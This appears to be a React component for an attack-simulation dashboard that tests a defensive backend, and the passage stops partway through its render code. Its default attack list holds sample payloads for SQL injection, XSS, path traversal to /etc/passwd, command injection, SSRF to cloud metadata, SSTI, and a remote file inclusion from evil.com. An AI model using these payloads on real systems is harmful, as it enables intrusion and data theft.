import { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useTranslation } from 'react-i18next';
import {
    Shield,
    Play,
    RefreshCw,
    CheckCircle,
    XCircle,
    Clock,
    BarChart3,
    Zap,
    Terminal,
    Bot,
    Users,
    Activity,
    Database,
    Code,
    FolderOpen,
    TerminalSquare,
    Gauge,
    ChevronDown,
    ChevronRight,
    AlertTriangle,
    Server,
    Cloud,
    Key,
    Wifi,
    AlertCircle,
    Upload,
    Cpu,
} from 'lucide-react';
import { fetchAttackTypes, runAttackSimulation, fetchAttackHistory } from '../services/api';
import type { AttackType, AttackResult, AttackSimulationReport } from '../types/api';
import { useDemo } from '../context/DemoContext';
import { useWebSocket } from '../context/WebSocketContext';

const ATTACK_CATEGORIES_CONFIG = [
    { id: 'sql_injection', icon: Database, color: 'text-red-400', bgColor: 'bg-red-500/10', borderColor: 'border-red-500/30' },
    { id: 'xss', icon: Code, color: 'text-orange-400', bgColor: 'bg-orange-500/10', borderColor: 'border-orange-500/30' },
    { id: 'path_traversal', icon: FolderOpen, color: 'text-yellow-400', bgColor: 'bg-yellow-500/10', borderColor: 'border-yellow-500/30' },
    { id: 'command_injection', icon: TerminalSquare, color: 'text-purple-400', bgColor: 'bg-purple-500/10', borderColor: 'border-purple-500/30' },
    { id: 'rate_abuse', icon: Gauge, color: 'text-blue-400', bgColor: 'bg-blue-500/10', borderColor: 'border-blue-500/30' },
    { id: 'csrf', icon: Shield, color: 'text-pink-400', bgColor: 'bg-pink-500/10', borderColor: 'border-pink-500/30' },
    { id: 'ssrf', icon: Activity, color: 'text-cyan-400', bgColor: 'bg-cyan-500/10', borderColor: 'border-cyan-500/30' },
    { id: 'xxe', icon: FolderOpen, color: 'text-lime-400', bgColor: 'bg-lime-500/10', borderColor: 'border-lime-500/30' },
    { id: 'dos', icon: Zap, color: 'text-rose-400', bgColor: 'bg-rose-500/10', borderColor: 'border-rose-500/30' },
    { id: 'ldap_injection', icon: Users, color: 'text-indigo-400', bgColor: 'bg-indigo-500/10', borderColor: 'border-indigo-500/30' },
    { id: 'nosql_injection', icon: Database, color: 'text-violet-400', bgColor: 'bg-violet-500/10', borderColor: 'border-violet-500/30' },
    { id: 'http_smuggling', icon: Terminal, color: 'text-fuchsia-400', bgColor: 'bg-fuchsia-500/10', borderColor: 'border-fuchsia-500/30' },
    { id: 'ssti', icon: Code, color: 'text-teal-400', bgColor: 'bg-teal-500/10', borderColor: 'border-teal-500/30' },
    { id: 'deserialization', icon: TerminalSquare, color: 'text-amber-400', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/30' },
    { id: 'privilege_escalation', icon: Shield, color: 'text-emerald-400', bgColor: 'bg-emerald-500/10', borderColor: 'border-emerald-500/30' },
    { id: 'man_in_the_middle', icon: Activity, color: 'text-sky-400', bgColor: 'bg-sky-500/10', borderColor: 'border-sky-500/30' },
    { id: 'dns_hijacking', icon: Zap, color: 'text-stone-400', bgColor: 'bg-stone-500/10', borderColor: 'border-stone-500/30' },
    { id: 'cache_poisoning', icon: Database, color: 'text-neutral-400', bgColor: 'bg-neutral-500/10', borderColor: 'border-neutral-500/30' },
    { id: 'clickjacking', icon: FolderOpen, color: 'text-zinc-400', bgColor: 'bg-zinc-500/10', borderColor: 'border-zinc-500/30' },
    { id: 'replay_attack', icon: Clock, color: 'text-red-300', bgColor: 'bg-red-400/10', borderColor: 'border-red-400/30' },
    { id: 'session_fixation', icon: Shield, color: 'text-orange-300', bgColor: 'bg-orange-400/10', borderColor: 'border-orange-400/30' },
    { id: 'user_enumeration', icon: Users, color: 'text-yellow-300', bgColor: 'bg-yellow-400/10', borderColor: 'border-yellow-400/30' },
    { id: 'cors_misconfig', icon: Terminal, color: 'text-green-300', bgColor: 'bg-green-400/10', borderColor: 'border-green-400/30' },
    { id: 'host_header_injection', icon: Code, color: 'text-blue-300', bgColor: 'bg-blue-400/10', borderColor: 'border-blue-400/30' },
    { id: 'auth_bypass', icon: TerminalSquare, color: 'text-purple-300', bgColor: 'bg-purple-400/10', borderColor: 'border-purple-400/30' },
    { id: 'file_upload', icon: Upload, color: 'text-pink-300', bgColor: 'bg-pink-400/10', borderColor: 'border-pink-400/30' },
    { id: 'file_inclusion', icon: FolderOpen, color: 'text-cyan-300', bgColor: 'bg-cyan-400/10', borderColor: 'border-cyan-400/30' },
    { id: 'jwt_attacks', icon: Key, color: 'text-lime-300', bgColor: 'bg-lime-400/10', borderColor: 'border-lime-400/30' },
    { id: 'password_reset_abuse', icon: Shield, color: 'text-rose-300', bgColor: 'bg-rose-400/10', borderColor: 'border-rose-400/30' },
    { id: 'graphql_injection', icon: Code, color: 'text-indigo-300', bgColor: 'bg-indigo-400/10', borderColor: 'border-indigo-400/30' },
    { id: 'websocket_attacks', icon: Wifi, color: 'text-violet-300', bgColor: 'bg-violet-400/10', borderColor: 'border-violet-400/30' },
    { id: 'api_security', icon: AlertCircle, color: 'text-fuchsia-300', bgColor: 'bg-fuchsia-400/10', borderColor: 'border-fuchsia-400/30' },
    { id: 'container_escape', icon: Cpu, color: 'text-teal-300', bgColor: 'bg-teal-400/10', borderColor: 'border-teal-400/30' },
    { id: 'kubernetes_attack', icon: Server, color: 'text-amber-300', bgColor: 'bg-amber-400/10', borderColor: 'border-amber-400/30' },
    { id: 'cloud_infrastructure', icon: Cloud, color: 'text-emerald-300', bgColor: 'bg-emerald-400/10', borderColor: 'border-emerald-400/30' }
];

const SEVERITY_STYLES = {
    critical: { bg: 'bg-red-500/20', text: 'text-red-400', border: 'border-red-500/50', glow: 'shadow-red-500/20' },
    high: { bg: 'bg-orange-500/20', text: 'text-orange-400', border: 'border-orange-500/50', glow: 'shadow-orange-500/20' },
    medium: { bg: 'bg-yellow-500/20', text: 'text-yellow-400', border: 'border-yellow-500/50', glow: 'shadow-yellow-500/20' },
    low: { bg: 'bg-blue-500/20', text: 'text-blue-400', border: 'border-blue-500/50', glow: 'shadow-blue-500/20' }
};

const AGENT_STYLES = {
    socrates: { color: 'text-red-400', bg: 'bg-red-500/10', border: 'border-red-500/30', name: 'Socrates' },
    plato: { color: 'text-blue-400', bg: 'bg-blue-500/10', border: 'border-blue-500/30', name: 'Plato' },
    aristotle: { color: 'text-purple-400', bg: 'bg-purple-500/10', border: 'border-purple-500/30', name: 'Aristotle' },
    orchestrator: { color: 'text-green-400', bg: 'bg-green-500/10', border: 'border-green-500/30', name: 'Orchestrator' },
    system: { color: 'text-gray-400', bg: 'bg-gray-500/10', border: 'border-gray-500/30', name: 'System' }
};

interface AgentAnalysis {
    attackId: string;
    agent: string;
    status: string;
    message: string;
    verdict?: string;
    confidence?: number;
    reasoning?: string;
    evidence?: any[];
}

interface AttackProgress {
    attackId: string;
    attackName: string;
    category: string;
    severity: string;
    payload: string;
    status: 'pending' | 'analyzing' | 'complete';
    result?: AttackResult;
    analyses: AgentAnalysis[];
}

const containerVariants = {
    hidden: { opacity: 0 },
    visible: {
        opacity: 1,
        transition: { staggerChildren: 0.1 }
    }
};

const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 }
};

export default function AttackSimulator() {
    const { t } = useTranslation();
    const { isDemoMode } = useDemo();
    const { connected: wsConnected, subscribe } = useWebSocket();
    
    const [attackTypes, setAttackTypes] = useState<AttackType[]>([]);
    const [selectedAttacks, setSelectedAttacks] = useState<string[]>([]);
    const [isRunning, setIsRunning] = useState(false);
    const [report, setReport] = useState<AttackSimulationReport | null>(null);
    const [history, setHistory] = useState<AttackSimulationReport[]>([]);
    const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
    const [attackProgress, setAttackProgress] = useState<AttackProgress[]>([]);
    const [expandedCategories, setExpandedCategories] = useState<string[]>(ATTACK_CATEGORIES_CONFIG.map(c => c.id));

    const terminalRef = useRef<HTMLDivElement>(null);

    const ATTACK_CATEGORIES = ATTACK_CATEGORIES_CONFIG.map(cat => ({
        ...cat,
        name: t(`attackSimulator.categories.${cat.id}`)
    }));

    const addLocalTerminalLog = useCallback((message: string) => {
        const timestamp = new Date().toLocaleTimeString();
        setTerminalLogs(prev => [...prev, `[${timestamp}] ${message}`]);
    }, []);

    useEffect(() => {
        loadAttackTypes();
        loadHistory();
    }, []);

    useEffect(() => {
        const unsubscribe = subscribe('*', (data: any) => {
            const { event, ...eventData } = data;

            switch (event) {
                case 'attack:simulation:start':
                    addLocalTerminalLog(`Starting simulation: ${eventData.totalAttacks} attacks`);
                    setAttackProgress(eventData.attacks.map((a: any) => ({
                        attackId: a.id,
                        attackName: a.name,
                        category: a.category,
                        severity: a.severity,
                        payload: a.payload,
                        status: 'pending' as const,
                        analyses: []
                    })));
                    setIsRunning(true);
                    break;

                case 'attack:start':
                    addLocalTerminalLog(`Starting attack: ${eventData.attackName}`);
                    setAttackProgress(prev => prev.map((p, i) => 
                        i === eventData.attackIndex 
                            ? { ...p, status: 'analyzing' }
                            : p
                    ));
                    break;

                case 'agent:analysis':
                    addLocalTerminalLog(`[${eventData.agent.toUpperCase()}] ${eventData.message}`);
                    setAttackProgress(prev => prev.map(p => 
                        p.attackId === eventData.attackId
                            ? { ...p, analyses: [...p.analyses, eventData] }
                            : p
                    ));
                    break;

                case 'attack:result':
                    addLocalTerminalLog(`Result: ${eventData.attackName} - ${eventData.blocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}`);
                    setAttackProgress(prev => prev.map((p, i) => 
                        i === eventData.attackIndex
                            ? { ...p, status: 'complete', result: eventData }
                            : p
                    ));
                    break;

                case 'attack:simulation:complete':
                    addLocalTerminalLog(t('attackSimulator.completed'));
                    setReport(eventData);
                    setIsRunning(false);
                    break;
            }
        });

        return () => {
            unsubscribe();
        };
    }, [subscribe, addLocalTerminalLog, t]);

    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [terminalLogs]);

    const loadAttackTypes = async () => {
        const types = await fetchAttackTypes();
        if (types.length > 0) {
            setAttackTypes(types);
        } else if (isDemoMode) {
            setAttackTypes(getDefaultAttackTypes());
        } else {
            setAttackTypes([]);
        }
    };

    const loadHistory = async () => {
        const data = await fetchAttackHistory();
        setHistory(data);
    };

    const getDefaultAttackTypes = (): AttackType[] => {
        return [
            // SQL Injection Attacks
            { id: 'sql-1', name: "Basic OR Bypass", category: 'sql_injection', severity: 'critical', description: "' OR '1'='1' --" },
            { id: 'sql-2', name: "UNION SELECT", category: 'sql_injection', severity: 'critical', description: "UNION SELECT * FROM users" },
            { id: 'sql-3', name: "Comment Injection", category: 'sql_injection', severity: 'high', description: "admin'--" },
            { id: 'sql-4', name: "Time-Based Blind", category: 'sql_injection', severity: 'high', description: "'; WAITFOR DELAY '0:0:5'--" },
            { id: 'sql-5', name: "Error-Based", category: 'sql_injection', severity: 'high', description: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--" },
            { id: 'sql-6', name: "Stacked Queries", category: 'sql_injection', severity: 'critical', description: "'; DROP TABLE users--" },
            { id: 'sql-7', name: "Second Order", category: 'sql_injection', severity: 'critical', description: "Stored in database, executed later" },
            { id: 'sql-8', name: "NoSQL Injection (Mongo)", category: 'nosql_injection', severity: 'high', description: "username[$ne]=admin" },

            // XSS Attacks
            { id: 'xss-1', name: "Script Tag", category: 'xss', severity: 'high', description: "<script>alert('XSS')</script>" },
            { id: 'xss-2', name: "Event Handler", category: 'xss', severity: 'high', description: "<img src=x onerror=alert(1)>" },
            { id: 'xss-3', name: "Stored XSS", category: 'xss', severity: 'critical', description: "Persists in database, affects all users" },
            { id: 'xss-4', name: "DOM XSS", category: 'xss', severity: 'high', description: "location.hash.slice(1)" },
            { id: 'xss-5', name: "Self XSS", category: 'xss', severity: 'low', description: "User attacks themselves with malicious script" },
            { id: 'xss-6', name: "Reflected XSS", category: 'xss', severity: 'high', description: "Immediate reflection in HTTP response" },
            { id: 'xss-7', name: "Polyglot XSS", category: 'xss', severity: 'high', description: "Works across multiple contexts" },
            { id: 'xss-8', name: "XSS via POST", category: 'xss', severity: 'medium', description: "Stored through POST parameter" },

            // Path Traversal Attacks
            { id: 'path-1', name: "Basic Traversal", category: 'path_traversal', severity: 'critical', description: "../../../etc/passwd" },
            { id: 'path-2', name: "Null Byte Injection", category: 'path_traversal', severity: 'high', description: "../../../etc/passwd%00.jpg" },
            { id: 'path-3', name: "URL Encoded", category: 'path_traversal', severity: 'high', description: "%2e%2e%2fetc%2fpasswd" },
            { id: 'path-4', name: "Windows Path", category: 'path_traversal', severity: 'critical', description: "..\\..\\..\\windows\\system32\\" },
            { id: 'path-5', name: "Local File Inclusion", category: 'file_inclusion', severity: 'critical', description: "include.php?file=../../etc/passwd" },
            { id: 'path-6', name: "Remote File Inclusion", category: 'file_inclusion', severity: 'critical', description: "include.php?file=http://evil.com/shell.php" },

            // Command Injection Attacks
            { id: 'cmd-1', name: "Semicolon Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1; cat /etc/passwd" },
            { id: 'cmd-2', name: "Pipe Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1 | whoami" },
            { id: 'cmd-3', name: "Backtick Injection", category: 'command_injection', severity: 'critical', description: "127.0.0.1 `ls -la`" },
            { id: 'cmd-4', name: "Newline Injection", category: 'command_injection', severity: 'high', description: "127.0.0.1\\ncat /etc/passwd" },
            { id: 'cmd-5', name: "Argument Injection", category: 'command_injection', severity: 'high', description: "upload.php -filename evil.txt" },
            { id: 'cmd-6', name: "Subshell Injection", category: 'command_injection', severity: 'critical', description: "$(cat /etc/passwd)" },

            // Rate Limit / DoS Attacks
            { id: 'rate-1', name: "Rapid Requests", category: 'rate_abuse', severity: 'medium', description: "100 requests in 1 second" },
            { id: 'rate-2', name: "HTTP Flood", category: 'dos', severity: 'critical', description: "Distributed HTTP request flood" },
            { id: 'rate-3', name: "SYN Flood", category: 'dos', severity: 'critical', description: "TCP SYN packet flood" },
            { id: 'rate-4', name: "UDP Flood", category: 'dos', severity: 'high', description: "UDP packet amplification attack" },
            { id: 'rate-5', name: "Slowloris", category: 'dos', severity: 'high', description: "Slow HTTP connection exhaustion" },
            { id: 'rate-6', name: "Ping Flood", category: 'dos', severity: 'medium', description: "ICMP echo request flood" },
            { id: 'rate-7', name: "Smurf Attack", category: 'dos', severity: 'high', description: "ICMP broadcast amplification" },
            { id: 'rate-8', name: "Amplification DNS", category: 'dos', severity: 'high', description: "DNS amplification attack" },

            // CSRF Attacks
            { id: 'csrf-1', name: "Basic CSRF", category: 'csrf', severity: 'high', description: "Cross-site request forgery" },
            { id: 'csrf-2', name: "Stored CSRF", category: 'csrf', severity: 'high', description: "Stored CSRF payload" },
            { id: 'csrf-3', name: "Login CSRF", category: 'csrf', severity: 'high', description: "CSRF during login flow" },
            { id: 'csrf-4', name: "CSRF Token Bypass", category: 'csrf', severity: 'critical', description: "Missing or weak CSRF token" },

            // SSRF Attacks
            { id: 'ssrf-1', name: "Internal Port Scan", category: 'ssrf', severity: 'critical', description: "http://127.0.0.1:22" },
            { id: 'ssrf-2', name: "Cloud Metadata", category: 'ssrf', severity: 'critical', description: "http://169.254.169.254/latest/meta-data/" },
            { id: 'ssrf-3', name: "File Protocol", category: 'ssrf', severity: 'high', description: "file:///etc/passwd" },
            { id: 'ssrf-4', name: "DNS Rebinding", category: 'ssrf', severity: 'high', description: "DNS-based SSRF bypass" },
            { id: 'ssrf-5', name: "Gopher Protocol", category: 'ssrf', severity: 'high', description: "gopher://127.0.0.1:6379/_*1%0d%0a" },

            // XXE Attacks
            { id: 'xxe-1', name: "File Disclosure", category: 'xxe', severity: 'critical', description: "XXE to read /etc/passwd" },
            { id: 'xxe-2', name: "SSRF via XXE", category: 'xxe', severity: 'critical', description: "XXE for server-side request forgery" },
            { id: 'xxe-3', name: "Blind XXE", category: 'xxe', severity: 'high', description: "XXE with OOB data exfiltration" },
            { id: 'xxe-4', name: "XXE DoS", category: 'xxe', severity: 'high', description: "Billion laughs attack" },

            // LDAP Injection
            { id: 'ldap-1', name: "Basic LDAP Injection", category: 'ldap_injection', severity: 'high', description: "(&(uid=*)(password=*))" },
            { id: 'ldap-2', name: "LDAP AND Injection", category: 'ldap_injection', severity: 'high', description: "(&(uid=admin)(password=*))" },
            { id: 'ldap-3', name: "LDAP OR Injection", category: 'ldap_injection', severity: 'critical', description: "(|(uid=admin)(uid=test))" },
            { id: 'ldap-4', name: "LDAP Blind Injection", category: 'ldap_injection', severity: 'high', description: "Timing-based LDAP injection" },

            // HTTP Smuggling
            { id: 'http-1', name: "CL.TE Smuggling", category: 'http_smuggling', severity: 'high', description: "Content-Length + Transfer-Encoding clash" },
            { id: 'http-2', name: "TE.CL Smuggling", category: 'http_smuggling', severity: 'high', description: "Transfer-Encoding + Content-Length clash" },
            { id: 'http-3', name: "Request Splitting", category: 'http_smuggling', severity: 'critical', description: "CRLF injection to split requests" },
            { id: 'http-4', name: "Cache Poisoning", category: 'http_smuggling', severity: 'critical', description: "HTTP smuggling cache poisoning" },

            // SSTI Attacks
            { id: 'ssti-1', name: "Jinja2 SSTI", category: 'ssti', severity: 'critical', description: "{{config.items()}}" },
            { id: 'ssti-2', name: "ERB SSTI", category: 'ssti', severity: 'critical', description: "<%= system('id') %>" },
            { id: 'ssti-3', name: "Twig SSTI", category: 'ssti', severity: 'critical', description: "{{_self.env.display(\"id\")}}" },
            { id: 'ssti-4', name: "FreeMarker SSTI", category: 'ssti', severity: 'high', description: "<#assign ex=\"freemarker.template.utility.Execute\">" },

            // Deserialization Attacks
            { id: 'deser-1', name: "Java Deserialization", category: 'deserialization', severity: 'critical', description: "ysoserial CommonsCollections1" },
            { id: 'deser-2', name: "PHP Object Injection", category: 'deserialization', severity: 'critical', description: "Unserialize gadget chain" },
            { id: 'deser-3', name: "Python Pickle", category: 'deserialization', severity: 'critical', description: "Malicious pickle payload" },
            { id: 'deser-4', name: "Node.js Deserialization", category: 'deserialization', severity: 'high', description: "node-serialize exploit" },

            // Privilege Escalation
            { id: 'priv-1', name: "IDOR", category: 'privilege_escalation', severity: 'high', description: "Insecure direct object reference" },
            { id: 'priv-2', name: "Broken Access Control", category: 'privilege_escalation', severity: 'high', description: "Bypass admin endpoint access" },
            { id: 'priv-3', name: "Privilege Boundary", category: 'privilege_escalation', severity: 'critical', description: "Cross-privilege access" },
            { id: 'priv-4', name: "Role-Based Bypass", category: 'privilege_escalation', severity: 'high', description: "RBAC misconfiguration" },

            // Man in the Middle
            { id: 'mitm-1', name: "SSL Strip", category: 'man_in_the_middle', severity: 'high', description: "Downgrade HTTPS to HTTP" },
            { id: 'mitm-2', name: "ARP Poisoning", category: 'man_in_the_middle', severity: 'high', description: "ARP cache poisoning" },
            { id: 'mitm-3', name: "DNS Spoofing", category: 'dns_hijacking', severity: 'high', description: "Fake DNS responses" },
            { id: 'mitm-4', name: "BGP Hijacking", category: 'man_in_the_middle', severity: 'critical', description: "BGP route hijacking" },

            // Cache Poisoning
            { id: 'cache-1', name: "Web Cache Poisoning", category: 'cache_poisoning', severity: 'high', description: "Cache key manipulation" },
            { id: 'cache-2', name: "Cache Deception", category: 'cache_poisoning', severity: 'high', description: "Cache header manipulation" },
            { id: 'cache-3', name: "DNS Cache Poisoning", category: 'dns_hijacking', severity: 'high', description: "Cache pollution attack" },

            // Clickjacking
            { id: 'click-1', name: "Basic Clickjacking", category: 'clickjacking', severity: 'medium', description: "UI redress attack via iframe" },
            { id: 'click-2', name: "Likejacking", category: 'clickjacking', severity: 'low', description: "Clickjacking social networks" },

            // Replay Attack
            { id: 'replay-1', name: "Token Replay", category: 'replay_attack', severity: 'high', description: "Replay captured JWT" },
            { id: 'replay-2', name: "OTP Replay", category: 'replay_attack', severity: 'medium', description: "Reuse one-time password" },

            // Session Fixation
            { id: 'sess-1', name: "Session Fixation", category: 'session_fixation', severity: 'high', description: "Enforce fixed session ID" },
            { id: 'sess-2', name: "Session Hijacking", category: 'session_fixation', severity: 'high', description: "Steal and use session cookie" },

            // User Enumeration
            { id: 'enum-1', name: "User Enumeration", category: 'user_enumeration', severity: 'medium', description: "Guess existing usernames" },
            { id: 'enum-2', name: "Email Enumeration", category: 'user_enumeration', severity: 'medium', description: "Password reset email timing" },

            // CORS Misconfiguration
            { id: 'cors-1', name: "CORS Wildcard", category: 'cors_misconfig', severity: 'medium', description: "Access-Control-Allow-Origin: *" },
            { id: 'cors-2', name: "CORS Bypass", category: 'cors_misconfig', severity: 'high', description: "Reflect origin without validation" },

            // Host Header Injection
            { id: 'host-1', name: "Host Header Injection", category: 'host_header_injection', severity: 'medium', description: "Poison Host header value" },
            { id: 'host-2', name: "Cache Poisoning via Host", category: 'host_header_injection', severity: 'high', description: "Host-based cache poisoning" },

            // Auth Bypass
            { id: 'auth-1', name: "JWT None Algorithm", category: 'jwt_attacks', severity: 'critical', description: "alg: none bypass" },
            { id: 'auth-2', name: "Weak JWT Secret", category: 'jwt_attacks', severity: 'high', description: "Brute force JWT secret" },
            { id: 'auth-3', name: "JWT Key Confusion", category: 'jwt_attacks', severity: 'high', description: "RSA/HMAC confusion attack" },
            { id: 'auth-4', name: "Hardcoded Credentials", category: 'auth_bypass', severity: 'critical', description: "Default admin credentials" },
            { id: 'auth-5', name: "Authentication Bypass", category: 'auth_bypass', severity: 'critical', description: "Skip auth check entirely" },

            // File Upload Attacks
            { id: 'upload-1', name: "Shell Upload", category: 'file_upload', severity: 'critical', description: "Upload malicious PHP shell" },
            { id: 'upload-2', name: "MIME Type Bypass", category: 'file_upload', severity: 'high', description: "Upload PHP as .jpg" },
            { id: 'upload-3', name: "ImageTragick", category: 'file_upload', severity: 'high', description: "Polyglot JPG/PHP" },

            // GraphQL Injection
            { id: 'graphql-1', name: "GraphQL Injection", category: 'graphql_injection', severity: 'high', description: "Inject into GraphQL query" },
            { id: 'graphql-2', name: "GraphQL DoS", category: 'graphql_injection', severity: 'medium', description: "Nested query DoS" },
            { id: 'graphql-3', name: "GraphQL Introspection", category: 'graphql_injection', severity: 'low', description: "Dump GraphQL schema" },

            // WebSocket Attacks
            { id: 'ws-1', name: "WebSocket XSS", category: 'websocket_attacks', severity: 'high', description: "XSS via WebSocket message" },
            { id: 'ws-2', name: "WebSocket DoS", category: 'websocket_attacks', severity: 'medium', description: "WebSocket message flood" },

            // API Security
            { id: 'api-1', name: "Mass Assignment", category: 'api_security', severity: 'medium', description: "Overwrite object fields" },
            { id: 'api-2', name: "IDOR", category: 'api_security', severity: 'high', description: "Access other users' data" },
            { id: 'api-3', name: "API Key Leakage", category: 'api_security', severity: 'high', description: "Expose API keys in logs" },

            // Container/Cloud Attacks
            { id: 'cont-1', name: "Container Escape", category: 'container_escape', severity: 'critical', description: "Break out of Docker container" },
            { id: 'cont-2', name: "K8s RBAC Bypass", category: 'kubernetes_attack', severity: 'critical', description: "Escalate K8s privileges" },
            { id: 'cont-3', name: "IAM Privilege Escalation", category: 'cloud_infrastructure', severity: 'critical', description: "Escalate cloud IAM roles" },
            { id: 'cont-4', name: "SSRF in Cloud", category: 'cloud_infrastructure', severity: 'critical', description: "Access cloud metadata service" },
            { id: 'cont-5', name: "Secret Exposure", category: 'cloud_infrastructure', severity: 'high', description: "Leak cloud credentials" }
        ];
    };

    const toggleAttack = (id: string) => {
        setSelectedAttacks(prev => 
            prev.includes(id) 
                ? prev.filter(a => a !== id)
                : [...prev, id]
        );
    };

    const toggleCategory = (id: string) => {
        setExpandedCategories(prev => 
            prev.includes(id) 
                ? prev.filter(c => c !== id)
                : [...prev, id]
        );
    };

    const selectAll = () => {
        if (selectedAttacks.length === attackTypes.length) {
            setSelectedAttacks([]);
        } else {
            setSelectedAttacks(attackTypes.map(a => a.id));
        }
    };

    const runSimulation = async () => {
        setIsRunning(true);
        setTerminalLogs([]);
        setReport(null);
        setAttackProgress([]);

        addLocalTerminalLog(`${t('attackSimulator.runSimulation')}...`);
        addLocalTerminalLog(`${t('attackSimulator.selected')} ${selectedAttacks.length} ${t('attackSimulator.attacks')}`);

        const result = await runAttackSimulation(
            selectedAttacks.length > 0 ? selectedAttacks : undefined
        );

        if (result) {
            setReport(result);
            addLocalTerminalLog(`${t('attackSimulator.completed')}!`);
            addLocalTerminalLog(`   ${t('attackSimulator.total')}: ${result.total}`);
            addLocalTerminalLog(`   ${t('attackSimulator.blocked')}: ${result.blocked}`);
            addLocalTerminalLog(`   ${t('attackSimulator.allowed')}: ${result.allowed}`);
        } else {
            addLocalTerminalLog('Simulation failed - No data available');
        }

        setIsRunning(false);
    };

    const getBlockRate = () => {
        if (!report || report.total === 0) return 0;
        return ((report.blocked / report.total) * 100).toFixed(1);
    };

    const getSeverityStyle = (severity: string) => {
        return SEVERITY_STYLES[severity as keyof typeof SEVERITY_STYLES] || SEVERITY_STYLES.medium;
    };

    const getAgentStyle = (agent: string) => {
        return AGENT_STYLES[agent as keyof typeof AGENT_STYLES] || AGENT_STYLES.system;
    };

    const getCategoryName = (categoryId: string) => {
        return t(`attackSimulator.categories.${categoryId}`);
    };

    const getSeverityName = (severity: string) => {
        return t(`attackSimulator.severities.${severity}`);
    };

    return (
        <motion.div 
            initial="hidden"
            animate="visible"
            variants={containerVariants}
            className="p-6 space-y-6 min-h-[calc(100vh-80px)]"
        >
            <motion.div variants={itemVariants} className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                    <div className="relative">
                        <div className="absolute inset-0 bg-red-500/20 blur-xl rounded-full" />
                        <div className="relative p-3 bg-gradient-to-br from-red-500/20 to-orange-500/20 rounded-xl border border-red-500/30">
                            <Shield className="w-8 h-8 text-red-400" />
                        </div>
                    </div>
                    <div>
                        <h1 className="text-2xl font-bold text-white">{t('attackSimulator.title')}</h1>
                        <p className="text-gray-400 text-sm">{t('attackSimulator.subtitle')}</p>
                    </div>
                </div>
                <div className="flex items-center gap-3 flex-wrap">
                    <motion.div 
                        animate={{ scale: wsConnected ? [1, 1.05, 1] : 1 }}
                        transition={{ repeat: wsConnected ? Infinity : 0, duration: 2 }}
                        className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium ${
                            wsConnected 
                                ? 'bg-green-500/10 text-green-400 border border-green-500/30' 
                                : 'bg-red-500/10 text-red-400 border border-red-500/30'
                        }`}
                    >
                        <Activity className="w-4 h-4" />
                        {wsConnected ? t('attackSimulator.liveConnected') : t('attackSimulator.disconnected')}
                    </motion.div>
                    <button
                        onClick={selectAll}
                        className="px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg hover:bg-gray-700 transition-all text-sm text-white"
                    >
                        {selectedAttacks.length === attackTypes.length ? t('attackSimulator.deselectAll') : t('attackSimulator.selectAll')}
                    </button>
                    <motion.button
                        whileHover={{ scale: 1.02 }}
                        whileTap={{ scale: 0.98 }}
                        onClick={runSimulation}
                        disabled={isRunning}
                        className="flex items-center gap-2 px-6 py-2.5 bg-gradient-to-r from-red-500 to-orange-500 rounded-lg font-medium text-white shadow-lg shadow-red-500/25 hover:shadow-red-500/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {isRunning ? (
                            <>
                                <RefreshCw className="w-4 h-4 animate-spin" />
                                {t('attackSimulator.running')}
                            </>
                        ) : (
                            <>
                                <Play className="w-4 h-4" />
                                {t('attackSimulator.runSimulation')}
                            </>
                        )}
                    </motion.button>
                </div>
            </motion.div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                <motion.div variants={itemVariants} className="lg:col-span-3">
                    <div className="bg-gray-900/80 backdrop-blur border border-gray-700/50 rounded-2xl overflow-hidden">
                        <div className="p-4 border-b border-gray-700/50 bg-gradient-to-r from-gray-800 to-transparent">
                            <h2 className="text-lg font-semibold text-white flex items-center gap-2">
                                <Zap className="w-5 h-5 text-yellow-400" />
                                {t('attackSimulator.attackTypes')}
                            </h2>
                            <p className="text-xs text-gray-400 mt-1">{selectedAttacks.length} {t('attackSimulator.selected')}</p>
                        </div>
                        <div className="p-3 space-y-2 max-h-[calc(100vh-320px)] overflow-y-auto">
                            {ATTACK_CATEGORIES.map(category => {
                                const categoryAttacks = attackTypes.filter(a => a.category === category.id);
                                const isExpanded = expandedCategories.includes(category.id);
                                const selectedInCategory = categoryAttacks.filter(a => selectedAttacks.includes(a.id)).length;
                                const Icon = category.icon;
                                
                                return (
                                    <div key={category.id} className={`rounded-xl overflow-hidden ${category.borderColor} border`}>
                                        <button
                                            onClick={() => toggleCategory(category.id)}
                                            className={`w-full flex items-center justify-between p-3 ${category.bgColor} hover:brightness-110 transition-all`}
                                        >
                                            <div className="flex items-center gap-2">
                                                <Icon className={`w-4 h-4 ${category.color}`} />
                                                <span className={`font-medium text-sm ${category.color}`}>{category.name}</span>
                                                {selectedInCategory > 0 && (
                                                    <span className="text-xs px-1.5 py-0.5 rounded-full bg-white/10 text-white">
                                                        {selectedInCategory}
                                                    </span>
                                                )}
                                            </div>
                                            {isExpanded ? (
                                                <ChevronDown className="w-4 h-4 text-gray-400" />
                                            ) : (
                                                <ChevronRight className="w-4 h-4 text-gray-400" />
                                            )}
                                        </button>
                                        <AnimatePresence>
                                            {isExpanded && (
                                                <motion.div
                                                    initial={{ height: 0, opacity: 0 }}
                                                    animate={{ height: 'auto', opacity: 1 }}
                                                    exit={{ height: 0, opacity: 0 }}
                                                    transition={{ duration: 0.2 }}
                                                    className="overflow-hidden"
                                                >
                                                    <div className="p-2 space-y-1 bg-gray-950/50">
                                                        {categoryAttacks.map(attack => {
                                                            const isSelected = selectedAttacks.includes(attack.id);
                                                            const severityStyle = getSeverityStyle(attack.severity);
                                                            
                                                            return (
                                                                <motion.button
                                                                    key={attack.id}
                                                                    whileHover={{ x: 2 }}
                                                                    whileTap={{ scale: 0.98 }}
